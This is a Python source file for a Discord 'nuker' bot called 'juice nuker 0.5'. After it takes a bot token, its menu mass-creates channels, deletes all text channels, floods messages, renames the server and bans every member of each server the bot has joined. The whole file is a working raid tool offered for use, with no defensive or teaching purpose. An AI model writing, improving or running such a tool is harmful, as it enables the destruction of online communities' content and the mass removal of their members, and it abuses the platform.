import discord
from discord.ext import commands
import asyncio
import os
import shutil
import ctypes 

def orange_ascii_art():
    return """
\033[38;5;208m
                       ██╗██╗   ██╗██╗ ██████╗███████╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
                       ██║██║   ██║██║██╔════╝██╔════╝    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
                       ██║██║   ██║██║██║     █████╗      ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
                  ██   ██║██║   ██║██║██║     ██╔══╝      ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
                  ╚█████╔╝╚██████╔╝██║╚██████╗███████╗    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
                   ╚════╝  ╚═════╝ ╚═╝ ╚═════╝╚══════╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                        hard skidded uhmm i mean coded by xyz1337                                                                   
\033[0m
"""


def titlee(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)

intents = discord.Intents.all()
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

token = input("Enter bot token: ")

async def create_channels(guild, num_channels, channel_name):
    tasks = [guild.create_text_channel(channel_name) for _ in range(num_channels)]
    await asyncio.gather(*tasks)

async def delete_channels(guild):
    tasks = [channel.delete() for channel in guild.text_channels]
    await asyncio.gather(*tasks)

async def send_messages(guild, num_messages, message_text):
    channels = guild.text_channels
    num_channels = len(channels)
    if not channels:
        print("No text channels found on the server.")
        return

    tasks = []
    for i in range(num_messages):
        channel = channels[i % num_channels]
        tasks.append(channel.send(message_text))
    await asyncio.gather(*tasks)

async def change_server_name(guild, new_name):
    await guild.edit(name=new_name)
    print(f'Server name changed to: {new_name}.')

async def ban_everyone(guild):
    tasks = [member.ban() for member in guild.members]
    for task in tasks:
        try:
            await task
        except discord.Forbidden:
            print(f'Cannot ban user, missing permissions.')
        except discord.HTTPException:
            print(f'Failed to ban user.')

async def mini_menu(guild):
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        columns, _ = shutil.get_terminal_size()
        padding = (columns - 50) // 2


        console_title = f"juice nuker 0.5 | {os.getenv('USERNAME')} | {bot.user.name}"
        titlee(console_title)

        print(' ' * padding + orange_ascii_art())

        print(' ' * padding + "\033[38;5;208m╔════════════════════════════════════════════════╗")
        print(' ' * padding + "║                      MENU                      ║")
        print(' ' * padding + "╠════════════════════════════════════════════════╣")
        print(' ' * padding + "║ {1.} CREATE CHANNELS                           ║")
        print(' ' * padding + "║ {2.} DELETE CHANNELS                           ║")
        print(' ' * padding + "║ {3.} SEND MESSAGES                             ║")
        print(' ' * padding + "║ {4.} SERVER NAME                               ║")
        print(' ' * padding + "║ {5.} BAN EVERYONE                              ║")
        print(' ' * padding + "║ {6.} EXIT                                      ║")
        print(' ' * padding + "╚════════════════════════════════════════════════╝\033[0m")

        choice = input(">> ")

        try:
            if choice == "1":
                num_channels = int(input("Enter number of channels to create: "))
                channel_name = input("Enter channel name: ")
                await create_channels(guild, num_channels, channel_name)
            elif choice == "2":
                await delete_channels(guild)
            elif choice == "3":
                num_messages = int(input("Enter number of messages to send: "))
                message_text = input("Enter message content: ")
                await send_messages(guild, num_messages, message_text)
            elif choice == "4":
                new_name = input("Enter new server name: ")
                await change_server_name(guild, new_name)
            elif choice == "5":
                await ban_everyone(guild)
            elif choice == "6":
                break
            else:
                print("Invalid choice.")
        except KeyboardInterrupt:
            print("\nOperation interrupted. Returning to menu...")
            continue

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    for guild in bot.guilds:
        await mini_menu(guild)
    await bot.close()

bot.run(token)
